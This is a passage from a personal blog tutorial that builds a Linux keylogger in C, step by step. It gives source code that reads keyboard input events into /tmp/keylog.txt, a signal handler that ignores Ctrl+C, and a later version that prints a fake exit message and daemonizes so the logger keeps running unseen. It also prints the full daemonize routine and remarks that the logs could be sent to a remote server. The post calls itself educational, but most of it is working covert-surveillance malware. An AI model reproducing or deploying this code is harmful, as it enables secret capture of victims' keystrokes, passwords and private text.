</span></span></code></pre></div><p>After compiling and executing the binary. We get <strong>logging - logged</strong> message on the terminal and the actual log is being stored in <code>/tmp/keylog.txt</code> file - as mentioned in <code>basic_keylogger.h</code> file.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*ikK7hBwfMweto2rYqhaBFg.png alt></p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*8wYAQGNMNS7TymthEnSb6g.png alt></p><hr><h3 id=what-next-getting-evil>What next? &mldr;Getting evil!!<a hidden class=anchor aria-hidden=true href=#what-next-getting-evil>#</a></h3><p>We can close the program by pressing <em>ctrl+c</em> or send it to background by <em>ctrl+z</em>. These key combinations send a signal to the process to close.
And we can handle these signals in our code&mldr;. using <code>signal.h</code> header file. (import this in the code.)</p><p>CODE - <code>basic_keylogger.c</code> (added signal handlers)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#include &#34;basic_keylogger.h&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>Signal</span> <span class=n>handler</span> <span class=n>function</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>signal_handler</span><span class=p>(</span><span class=ne>int</span> <span class=n>sig</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;Sorry, But I won&#39;t exit.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=ne>int</span> <span class=n>main</span><span class=p>(</span><span class=n>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>errno</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>struct</span> <span class=n>sigaction</span> <span class=k>signal</span><span class=p>;</span> <span class=o>//</span> <span class=n>create</span> <span class=k>signal</span> <span class=n>action</span> <span class=n>struct</span>
</span></span><span class=line><span class=cl>  <span class=k>signal</span><span class=o>.</span><span class=n>sa_handler</span> <span class=o>=</span> <span class=n>signal_handler</span><span class=p>;</span> <span class=o>//</span> <span class=n>initialize</span> <span class=n>the</span> <span class=n>handler</span> <span class=n>function</span>
</span></span><span class=line><span class=cl>  <span class=n>sigaction</span><span class=p>(</span><span class=n>SIGINT</span><span class=p>,</span> <span class=o>&amp;</span><span class=k>signal</span><span class=p>,</span> <span class=n>NULL</span><span class=p>);</span> <span class=o>//</span> <span class=n>assign</span> <span class=n>the</span> <span class=k>signal</span> <span class=n>action</span> <span class=n>to</span> <span class=n>a</span> <span class=n>specific</span> <span class=k>signal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>struct</span> <span class=n>input_event</span> <span class=n>ev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>char</span><span class=o>*</span> <span class=n>kbd</span> <span class=o>=</span> <span class=n>get_me_a_keyboard</span><span class=p>();</span> <span class=o>//</span> <span class=n>Get</span> <span class=n>keyboard</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>  <span class=n>char</span><span class=o>*</span> <span class=n>kbd_path</span> <span class=o>=</span> <span class=n>concat</span><span class=p>(</span><span class=n>INPUT_EVENT_DIR</span><span class=p>,</span> <span class=n>kbd</span><span class=p>);</span> <span class=o>//</span> <span class=n>Get</span> <span class=n>complete</span> <span class=n>path</span> <span class=k>for</span> <span class=n>keyboard</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=ne>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>kbd_path</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;Error </span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>errno</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;Reading from </span><span class=si>%s</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>kbd_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>kbd_path</span><span class=p>);</span> <span class=o>//</span> <span class=n>free</span> <span class=n>some</span> <span class=n>memory</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ev</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>struct</span> <span class=n>input_event</span><span class=p>));</span> <span class=o>//</span><span class=n>read</span> <span class=n>from</span> <span class=n>keyboard</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>ev</span><span class=o>.</span><span class=n>type</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>log_in_file</span><span class=p>(</span><span class=n>ev</span><span class=p>);</span> <span class=o>//</span><span class=nb>log</span> <span class=n>the</span> <span class=n>event</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>As expected with this code, I am unable to close the program with <em>ctrl+c</em>. Whenever I am pressing it, it gives me a message that <strong>&ldquo;Sorry, But I won&rsquo;t exit.&rdquo;</strong></p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*882rJMJZjAMEce-EupTVhg.png alt></p><p>This program can only be terminated with <strong>kill</strong> signal. See <a href=https://www.linux.com/training-tutorials/how-kill-process-command-line/>here</a> to know how.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*atvzfHlH5gEBaNw3PcoDgA.png alt></p><h3 id=going-undercover>Going undercover<a hidden class=anchor aria-hidden=true href=#going-undercover>#</a></h3><p>What if we trick user with a false closing message and go undercover <a href=https://notes.shichao.io/apue/ch13/>(Daemon process)</a>.</p><p>The idea is to create the process as a daemon process whenever the user press <em>ctrl+c</em>. Also give the user a good message so that he actually believes that the process has closed and then probably he&rsquo;ll not check for the running processes to find if it actually has closed.</p><p>To achieve this, I&rsquo;ll make slight changes to my <code>signal_handler</code> function and add a <code>daemonize</code> function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look <a href=https://notes.shichao.io/apue/ch13/>here</a>.</p><p>CODE:- <code>basic_keylogger.c</code> (changed the signal_handler function)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#include &#34;basic_keylogger.h&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>//</span> <span class=n>Signal</span> <span class=n>handler</span> <span class=n>function</span>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>signal_handler</span><span class=p>(</span><span class=ne>int</span> <span class=n>sig</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;Exiting very gracefully :)&#34;</span><span class=p>);</span> <span class=o>//</span><span class=n>fake</span> <span class=n>message</span>
</span></span><span class=line><span class=cl>  <span class=n>daemonize</span><span class=p>();</span> <span class=o>//</span> <span class=n>Go</span> <span class=n>undercover</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=ne>int</span> <span class=n>main</span><span class=p>(</span><span class=n>void</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>errno</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>struct</span> <span class=n>sigaction</span> <span class=k>signal</span><span class=p>;</span> <span class=o>//</span> <span class=n>create</span> <span class=k>signal</span> <span class=n>action</span> <span class=n>struct</span>
</span></span><span class=line><span class=cl>  <span class=k>signal</span><span class=o>.</span><span class=n>sa_handler</span> <span class=o>=</span> <span class=n>signal_handler</span><span class=p>;</span> <span class=o>//</span> <span class=n>initialize</span> <span class=n>the</span> <span class=n>handler</span> <span class=n>function</span>
</span></span><span class=line><span class=cl>  <span class=n>sigaction</span><span class=p>(</span><span class=n>SIGINT</span><span class=p>,</span> <span class=o>&amp;</span><span class=k>signal</span><span class=p>,</span> <span class=n>NULL</span><span class=p>);</span> <span class=o>//</span> <span class=n>assign</span> <span class=n>the</span> <span class=k>signal</span> <span class=n>action</span> <span class=n>to</span> <span class=n>a</span> <span class=n>specific</span> <span class=k>signal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>struct</span> <span class=n>input_event</span> <span class=n>ev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>char</span><span class=o>*</span> <span class=n>kbd</span> <span class=o>=</span> <span class=n>get_me_a_keyboard</span><span class=p>();</span> <span class=o>//</span> <span class=n>Get</span> <span class=n>keyboard</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>  <span class=n>char</span><span class=o>*</span> <span class=n>kbd_path</span> <span class=o>=</span> <span class=n>concat</span><span class=p>(</span><span class=n>INPUT_EVENT_DIR</span><span class=p>,</span> <span class=n>kbd</span><span class=p>);</span> <span class=o>//</span> <span class=n>Get</span> <span class=n>complete</span> <span class=n>path</span> <span class=k>for</span> <span class=n>keyboard</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=ne>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>kbd_path</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;Error </span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>errno</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s2>&#34;Reading from </span><span class=si>%s</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>kbd_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>kbd_path</span><span class=p>);</span> <span class=o>//</span> <span class=n>free</span> <span class=n>some</span> <span class=n>memory</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ev</span><span class=p>,</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>struct</span> <span class=n>input_event</span><span class=p>));</span> <span class=o>//</span><span class=n>read</span> <span class=n>from</span> <span class=n>keyboard</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>ev</span><span class=o>.</span><span class=n>type</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>log_in_file</span><span class=p>(</span><span class=n>ev</span><span class=p>);</span> <span class=o>//</span><span class=nb>log</span> <span class=n>the</span> <span class=n>event</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Here, I am using <code>daemonize</code> funtion which is defined in <code>./utils/daemonize.c</code> and imported in <code>basic_keylogger.h</code>.</p><p>CODE:- <code>daemonize.c</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>int daemonize()
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    pid_t pid, sid;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /* Fork off the parent process */
</span></span><span class=line><span class=cl>    pid = fork();
</span></span><span class=line><span class=cl>    if (pid &lt; 0) {
</span></span><span class=line><span class=cl>        exit(EXIT_FAILURE);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    /* If we got a good PID, then
</span></span><span class=line><span class=cl>        we can exit the parent process. */
</span></span><span class=line><span class=cl>    if (pid &gt; 0) { // Child can continue to run even after the parent has finished executing
</span></span><span class=line><span class=cl>        exit(EXIT_SUCCESS);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /* Change the file mode mask */
</span></span><span class=line><span class=cl>    umask(0);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /* Open any logs here */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /* Create a new SID for the child process */
</span></span><span class=line><span class=cl>    sid = setsid();
</span></span><span class=line><span class=cl>    if (sid &lt; 0) {
</span></span><span class=line><span class=cl>        /* Log the failure */
</span></span><span class=line><span class=cl>        exit(EXIT_FAILURE);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /* Change the current working directory */
</span></span><span class=line><span class=cl>    if ((chdir(&#34;/&#34;)) &lt; 0) {
</span></span><span class=line><span class=cl>        /* Log the failure */
</span></span><span class=line><span class=cl>        exit(EXIT_FAILURE);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /* Close out the standard file descriptors */
</span></span><span class=line><span class=cl>    //Because daemons generally dont interact directly with user so there is no need of keeping these open
</span></span><span class=line><span class=cl>    close(STDIN_FILENO);
</span></span><span class=line><span class=cl>    close(STDOUT_FILENO);
</span></span><span class=line><span class=cl>    close(STDERR_FILENO);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    return(pid);
</span></span><span class=line><span class=cl>}
</span></span></code></pre></div><p>After compiling and executing this code. We get a decent exit message like this.</p><p><img loading=lazy src=https://cdn-images-1.medium.com/max/640/1*y_eJXDhm9j1vkrAzajJUEA.png alt></p><p>But we can check from the <strong>/tmp/keylog.txt</strong> file that the program is still adding key events to the file. Use <code>tail -f /tmp/keylog.txt</code> command to check appending logs.</p><p>You can look for the process using <code>ps -A | grep 'your_binary_name'</code> command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using <code>kill -9 &lt;processID></code>.</p><hr><h3 id=conclusion>Conclusion.<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h3><p>You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do.
We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not.
Also with small modifications, I can send all the logs created locally to a remote server.</p><p>This program is only tested in a bare-metal linux system. This can&rsquo;t work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.</p><p>All this code is present in github repo here -> (<a href=https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger>https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger</a>)</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://ayedaemon.github.io/tags/linux/>Linux</a></li><li><a href=https://ayedaemon.github.io/tags/keylogger/>keylogger</a></li><li><a href=https://ayedaemon.github.io/tags/c-programming/>C programming</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://ayedaemon.github.io/>Connected</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>